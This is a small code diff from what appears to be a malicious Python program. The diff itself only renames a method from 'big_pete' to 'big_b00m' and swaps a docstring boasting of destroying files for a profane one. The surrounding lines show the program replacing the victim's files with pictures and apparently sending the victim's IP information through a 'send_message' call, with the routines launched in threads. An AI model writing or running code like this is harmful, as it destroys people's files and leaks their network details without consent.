@@ -56,9 +56,9 @@ class Main:
                             print('Replaced %s with %s' % (file,
                                                            self.picture_directory))
 
-    def big_pete(self) -> None:
+    def big_b00m(self) -> None:
         """
-        BIG PETE DESTROYING YOUR FILES!!!!!
+        fuck big bete, BIGB00M
         """
         threads = (
             threading.Thread(target=self.replace_files()),
@@ -88,7 +88,7 @@ if __name__ == '__main__':
         Main.send_message(Main.ip_info)
 
         Thread_1 = threading.Thread(
-            target=Main.big_pete()
+            target=Main.big_b00m()
         )
     except KeyboardInterrupt:
         pass
